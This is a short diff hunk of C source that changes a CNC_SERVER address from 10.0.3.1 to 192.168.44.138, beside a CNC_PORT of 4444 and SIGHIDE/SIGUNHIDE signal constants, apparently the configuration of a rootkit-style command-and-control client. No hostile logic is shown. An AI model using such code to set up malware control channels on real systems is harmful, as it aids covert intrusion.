@@ -12,7 +12,7 @@
 #include <sock_client.h>
 
 #define NI_MAXHOST 1025
-#define CNC_SERVER "10.0.3.1"
+#define CNC_SERVER "192.168.44.138"
 #define CNC_PORT "4444"
 #define SIGHIDE 4001
 #define SIGUNHIDE 4002
